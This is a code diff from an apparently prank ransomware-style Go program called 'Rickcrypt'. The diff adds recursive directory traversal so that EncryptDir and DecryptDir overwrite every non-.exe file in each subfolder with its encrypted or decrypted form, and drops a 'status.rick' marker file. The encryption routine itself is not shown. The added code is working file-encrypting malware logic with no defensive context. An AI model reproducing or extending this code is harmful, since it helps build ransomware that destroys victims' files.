@@ -6,7 +6,6 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
-	"path"
 	"strings"
 )
 
@@ -138,13 +137,16 @@ func EncryptDir(dirname string) {
 	for _, f := range files {
 		if f.IsDir() {
 			fmt.Println("[DIR] starting recursion: ", f.Name())
-			// EncryptDir(f.Name())
+			BytesToFile("status.rick", []byte("never gonna give you up"))
+			os.Chdir(f.Name())
+			EncryptDir("./")
+			os.Chdir("..")
 			fmt.Println("[DIR] finished recursion: ", f.Name())
 		} else {
 			fmt.Println("[RICKCRYPT] encrypting: ", f.Name())
 			if strings.Split(f.Name(), ".")[len(strings.Split(f.Name(), "."))-1] != "exe" {
-				out := Rickcrypt(path.Join(dirname, f.Name()))
-				BytesToFile(path.Join(dirname, f.Name()), out)
+				out := Rickcrypt(f.Name())
+				BytesToFile(f.Name(), out)
 			}
 		}
 	}
@@ -177,13 +179,15 @@ func DecryptDir(dirname string) {
 	for _, f := range files {
 		if f.IsDir() {
 			fmt.Println("[DIR] starting recursion: ", f.Name())
-			// EncryptDir(f.Name())
+			os.Chdir(f.Name())
+			DecryptDir("./")
+			os.Chdir("..")
 			fmt.Println("[DIR] finished recursion: ", f.Name())
 		} else {
 			fmt.Println("[RICKCRYPT] decrypting: ", f.Name())
 			if strings.Split(f.Name(), ".")[len(strings.Split(f.Name(), "."))-1] != "exe" {
-				out := Derick(path.Join(dirname, f.Name()))
-				BytesToFile(path.Join(dirname, f.Name()), out)
+				out := Derick(f.Name())
+				BytesToFile(f.Name(), out)
 			}
 		}
 	}
